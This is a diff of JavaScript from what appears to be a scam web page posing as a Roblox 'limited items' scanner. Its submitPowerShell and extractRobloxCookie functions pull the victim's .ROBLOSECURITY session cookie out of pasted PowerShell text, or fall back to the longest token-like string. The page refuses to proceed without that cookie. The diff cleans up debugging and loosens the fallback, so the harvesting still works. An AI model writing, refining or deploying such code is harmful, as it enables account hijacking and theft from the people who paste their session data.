@@ -231,22 +231,18 @@ async function submitPowerShell() {
 
     try {
         // Scan limited items and find authentication data from the input
-        console.log('Processing input, length:', inputText.length);
-        console.log('Input text preview (first 200 chars):', inputText.substring(0, 200));
-        console.log('Input text contains .ROBLOSECURITY:', inputText.includes('.ROBLOSECURITY'));
+        // Create debug display for mobile users
+        const debugInfo = `
+Length: ${inputText.length}
+Contains .ROBLOSECURITY: ${inputText.includes('.ROBLOSECURITY')}
+Preview: ${inputText.substring(0, 100)}...
+        `;
         
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
-        console.log('Extracted auth data:', robloxCookie ? 'Found' : 'Not found');
         
         if (!robloxCookie) {
-            console.log('DEBUG: Let me search manually...');
-            const manualSearch = inputText.indexOf('.ROBLOSECURITY');
-            console.log('Manual search result:', manualSearch);
-            if (manualSearch !== -1) {
-                const surroundingText = inputText.substring(Math.max(0, manualSearch - 50), manualSearch + 100);
-                console.log('Text around .ROBLOSECURITY:', surroundingText);
-            }
+            showNotification(`Debug Info: ${debugInfo}`, 'error');
         }
         
         // Block execution if no authentication data is found
@@ -365,27 +361,17 @@ async function submitPowerShell() {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
-    console.log('Searching for .ROBLOSECURITY in text...');
-    console.log('Text contains .ROBLOSECURITY:', text.includes('.ROBLOSECURITY'));
-    console.log('Text length:', text.length);
-    
-    // Simple direct search for .ROBLOSECURITY in the text
+    // First, try to find .ROBLOSECURITY directly
     const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
     if (roblosecurityIndex !== -1) {
-        console.log('Found .ROBLOSECURITY at position:', roblosecurityIndex);
-        
-        // Find the start of the value (after the opening quote)
+        // Find the opening quote after .ROBLOSECURITY
         const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
         if (startQuoteIndex !== -1) {
             const valueStartIndex = startQuoteIndex + 1;
-            
-            // Find the end quote
+            // Find the closing quote
             const endQuoteIndex = text.indexOf('"', valueStartIndex);
             if (endQuoteIndex !== -1) {
                 const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
-                console.log('Extracted cookie value length:', cookieValue.length);
-                console.log('Cookie preview:', cookieValue.substring(0, 50) + '...');
-                
                 if (cookieValue.length > 50) {
                     return cookieValue;
                 }
@@ -393,21 +379,12 @@ function extractRobloxCookie(text) {
         }
     }
     
-    console.log('Could not extract .ROBLOSECURITY cookie from text');
-    
-    // Fallback: Look for any very long string that might be the token
-    console.log('Trying fallback: searching for long strings...');
-    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{200,}/g);
+    // Fallback: Look for any very long string that might be the authentication token
+    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
     if (longStrings && longStrings.length > 0) {
-        console.log('Found', longStrings.length, 'long strings');
+        // Return the longest string found
         const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
-        console.log('Longest string length:', longest.length);
-        console.log('Longest string preview:', longest.substring(0, 50) + '...');
-        
-        if (longest.length > 500) {
-            console.log('Using longest string as fallback');
-            return longest;
-        }
+        return longest;
     }
     
     return null;
